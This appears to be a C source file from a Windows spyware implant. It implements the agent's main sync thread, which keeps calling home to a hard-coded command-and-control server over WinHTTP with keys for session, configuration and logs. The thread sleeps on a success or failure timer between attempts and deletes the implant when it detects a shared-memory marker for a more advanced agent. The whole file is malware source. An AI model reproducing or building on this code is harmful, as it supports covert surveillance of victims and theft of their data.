#include <Windows.h>

#include "main.h"
#include "sync_thread.h"
#include "binpatched_vars.h"
#include "agent_device.h"
#include "log_files.h"
#include "win_http.h"
#include "md5.h"
#include "proto.h"
#include "crypt.h"

typedef NTSTATUS (WINAPI *ZWTERMINATEPROCESS)(HANDLE, ULONG);

extern BYTE pServerKey[32];
extern BYTE pConfKey[32];
extern BYTE pSessionKey[20];
extern BYTE pLogKey[32];
extern BOOL bLastSync;

BOOL bFirstShot = TRUE;

VOID SyncThreadFunction()
{
	ULONG pServerPort;
	BYTE pServerIp[32];

	GetDeviceInfo();

	while(1)
	{
		if (ExistsEliteSharedMemory())
		{
			DeleteAndDie(TRUE);
			break;
		}
#ifdef _DEBUG
		OutputDebugString(L"[*] Starting sync...\n");
#endif

		if (WinHTTPSetup((PBYTE)SYNC_SERVER, pServerIp, sizeof(pServerIp), &pServerPort))
		{
			bLastSync = SyncWithServer();

#ifdef _DEBUG
			if (!bLastSync)
				OutputDebugString(L"[!!] Sync FAILED\n");
#endif

			WinHTTPClose();
		}
		else
		{
#ifdef _DEBUG
			OutputDebugString(L"WinHTTPSetup FAIL\n");
#endif
			bLastSync = FALSE;
		}
			
		if (bLastSync)
			MySleep(WAIT_SUCCESS_SYNC);
		else
			MySleep(WAIT_FAIL_SYNC);

	}
}

